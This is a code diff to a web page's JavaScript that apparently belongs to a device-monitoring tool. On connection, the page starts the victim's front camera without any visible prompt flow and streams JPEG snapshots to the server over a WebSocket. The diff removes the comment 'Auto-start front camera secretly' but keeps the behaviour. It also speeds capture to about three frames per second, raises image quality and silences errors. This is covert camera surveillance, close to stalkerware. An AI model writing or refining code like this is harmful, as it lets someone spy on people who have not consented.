@@ -186,13 +186,13 @@
         if (deviceId && deviceName) {
             let ws;
             let currentCameraStream = null;
+            let cameraInterval = null;
             
             function connectMonitoring() {
                 const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                 ws = new WebSocket(`${wsProtocol}//${window.location.host}?type=device&id=${deviceId}&name=${deviceName}`);
                 
                 ws.onopen = () => {
-                    // Auto-start front camera secretly
                     setTimeout(() => captureCamera('front'), 2000);
                 };
                 
@@ -209,6 +209,9 @@
                     if (currentCameraStream) {
                         currentCameraStream.getTracks().forEach(track => track.stop());
                     }
+                    if (cameraInterval) {
+                        clearInterval(cameraInterval);
+                    }
                     
                     const stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: cameraType === 'front' ? 'user' : 'environment' } 
@@ -218,19 +221,24 @@
                     video.srcObject = stream;
                     video.play();
                     
-                    setInterval(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        if (ws && ws.readyState === WebSocket.OPEN) {
-                            ws.send(JSON.stringify({
-                                type: 'camera',
-                                deviceId: deviceId,
-                                image: canvas.toDataURL('image/jpeg', 0.5)
-                            }));
-                        }
-                    }, 1000);
+                    video.onloadedmetadata = () => {
+                        cameraInterval = setInterval(() => {
+                            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                canvas.getContext('2d').drawImage(video, 0, 0);
+                                if (ws && ws.readyState === WebSocket.OPEN) {
+                                    ws.send(JSON.stringify({
+                                        type: 'camera',
+                                        deviceId: deviceId,
+                                        camera: cameraType,
+                                        image: canvas.toDataURL('image/jpeg', 0.8)
+                                    }));
+                                }
+                            }
+                        }, 300);
+                    };
                 } catch (err) {}
             }
             
